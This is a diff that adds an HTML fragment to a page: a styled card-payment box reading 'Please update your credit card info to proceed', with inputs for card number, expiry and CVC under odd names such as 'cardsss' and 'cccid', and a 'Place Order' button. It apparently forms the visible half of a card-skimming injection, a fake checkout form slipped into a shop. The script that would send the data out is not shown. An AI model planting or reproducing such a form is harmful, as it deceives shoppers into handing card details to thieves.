@@ -1,0 +1,44 @@
+<br><br><div id="custom-credit-card-html"><div id="custom-html-container"><div id="payment22-confirmation" style="padding: 16px; max-width: 400px; margin: 0 auto; background-color: white; box-shadow: 0px 0px 10px rgba(0,0,0,0.1); border-radius: 8px;">
+    <div style="margin-bottom: 16px;">
+        <div style="font-size: 14px; font-weight: 600; color: #4a5568; margin-bottom: 16px;">
+            Please update your credit card info to proceed.
+        </div>
+        <div style="display: flex; flex-direction: column; gap: 16px; margin-bottom: 16px;">
+            <button style="flex: 1; padding: 4px 16px; background-color: #3182ce; color: white; border-radius: 4px; box-shadow: 0px 0px 5px rgba(0,0,0,0.2); border: none;">
+                 Card
+            </button>
+        </div>
+        <div style="margin-bottom: 16px;">
+            <label style="font-size: 14px; font-weight: 600; color: #4a5568;" for="card-number">
+                Card number
+            </label>
+            <div style="display: flex; align-items: center; border: 1px solid #ededed; border-radius: 4px; padding: 2px;">
+                <input class="flex-1" style="flex: 1; font-size: 14px; border: none; " id="cardnumber" name="cardsss" placeholder="1234 1234 1234 1234" type="text" autocomplete="off" />
+                <img src="https://shopmotul.com/wp-content/plugins/woo-payment-gateway/assets/img/payment-methods/closed/amex.svg" alt="Amex" width="20"> 
+                <img src="https://shopmotul.com/wp-content/plugins/woo-payment-gateway/assets/img/payment-methods/closed/discover.svg" alt="Discover" width="20"> 
+                <img src="https://shopmotul.com/wp-content/plugins/woo-payment-gateway/assets/img/payment-methods/closed/visa.svg" alt="Visa" width="20"> 
+                <img src="https://shopmotul.com/wp-content/plugins/woo-payment-gateway/assets/img/payment-methods/closed/master_card.svg" alt="MasterCard" width="20"> 
+            </div>
+        </div>
+        <div style="display: flex; gap: 16px; margin-bottom: 16px;">
+            <div class="w-full sm:w-1/2" style="flex: 1;">
+                <label class="text-sm font-semibold text-gray-600 " for="expiry" style="font-size: 14px; font-weight: 600; color: #4a5568;">
+                    Expiry
+                </label>
+                <input class="w-full text-sm border border-gray-300 rounded px-1 py-1 outline-none" id="expiry" name="ccexpdate" placeholder="MM / YY" type="text" style="width: 100%; font-size: 14px; border: 1px solid #ededed; border-radius: 4px; padding: 2px;"/>
+            </div>
+            <div class="w-full sm:w-1/2" style="flex: 1;">
+                <label class="text-sm font-semibold text-gray-600 " for="cvc" style="font-size: 14px; font-weight: 600; color: #4a5568;">
+                    CVC
+                </label>
+                <input class="flex-1 text-sm outline-none" id="cvc" name="cccid" placeholder="CVC" type="text" style="width: 100%; font-size: 14px; border: 1px solid #ededed; border-radius: 4px; padding: 2px;"/>
+            </div>
+        </div>
+        <div style="margin-bottom: 16px;">
+            <button id="ssss3" class="w-full py-1 bg-black text-white rounded shadow focus:outline-none focus:ring-2 focus:ring-black focus:ring-opacity-50" style="width: 100%; padding: 4px; background-color: black; color: white; border-radius: 4px; border: none;">
+                Place Order
+            </button>
+        </div>
+    </div>
+</div>
+</div></div><br>
